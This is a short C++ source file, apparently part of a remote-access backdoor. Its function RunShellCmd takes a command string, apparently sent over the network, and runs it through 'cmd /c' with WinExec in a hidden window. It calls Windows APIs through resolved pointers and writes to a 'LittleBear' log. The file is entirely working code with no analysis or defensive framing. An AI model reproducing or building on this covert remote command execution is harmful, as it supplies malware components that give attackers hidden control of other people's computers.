
#include <Windows.h>
#include "../PublicVar.h"
#include "../network/NetWorkdata.h"
#include "../PublicFunc.h"
#include <json/json.h>




DWORD  __stdcall RunShellCmd(char* szCmd)
{
	int iRet = 0;
	char szShowInfo[1024];

	unsigned int iCmdLen = lplstrlenA(szCmd);
	if (iCmdLen <= 0 || iCmdLen >= 1024)
	{
		delete []szCmd;
		return FALSE;
	}

	string str = makeJsonFromTxt(szCmd);


	char szCmdOuptPutFileName[MAX_PATH]= {0};
	ModifyModuleFileName(szCmdOuptPutFileName,CMD_OUTPUT_FILE_NAME);

	//char szExecCmdFormat[MAX_PATH] = "cmd %s >> \"%s\"";
	char szExecCmdFormat[MAX_PATH] = "cmd /c %s";

	char szCmdCommand[MAX_CMD_LIMIT_SIZE];
	//iRet = lpwsprintfA(szCmdCommand,szExecCmdFormat,stdcmd,szCmdOuptPutFileName);
	iRet = lpwsprintfA(szCmdCommand, szExecCmdFormat, str.c_str());
	iRet = lpWinExec(szCmdCommand,SW_HIDE);
	if (iRet <= 31)
	{
		wsprintfA(szShowInfo,"RunCmd:%s error code:%u\r\n", szCmdCommand,lpRtlGetLastWin32Error());
		WriteLittleBearLog(szShowInfo);
	}
	else{
		wsprintfA(szShowInfo,"RunCmd:%s ok\r\n", szCmdCommand);
		WriteLittleBearLog(szShowInfo);
	}
	delete []szCmd;
	return TRUE;
}